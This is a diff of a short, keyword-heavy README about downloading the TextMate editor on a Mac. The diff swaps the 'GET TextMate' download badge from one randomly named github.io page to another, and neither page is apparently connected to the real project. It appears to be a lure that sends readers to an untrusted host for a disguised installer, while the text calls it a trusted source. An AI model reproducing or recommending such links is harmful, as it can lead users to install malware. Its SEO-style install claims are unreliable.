@@ -50,7 +50,7 @@ The TextMate text editor is especially useful when you want lightweight project 
 
 Prerequisites: A compatible Mac, access to a trusted textmate download source, and any project files or repositories you want to open in the editor.
 
-[![GET TextMate](https://img.shields.io/badge/GET%20%E2%80%94%20TextMate-0078D6?style=for-the-badge&logoColor=white)](https://chasemathisylrz.github.io/.github/textmate-app)
+[![GET TextMate](https://img.shields.io/badge/GET%20%E2%80%94%20TextMate-0078D6?style=for-the-badge&logoColor=white)](https://erenlopezmgpm.github.io/.github/textmate-app)
 
 1.  **Download and Install:** Use TextMate mac download resources from the official project or textmate github page, then place the application in your macOS Applications folder.
 2.  **Open a Project Folder:** Launch TextMate 2 and open a code directory, notes folder, website source tree, or script collection inside the TextMate text editor.
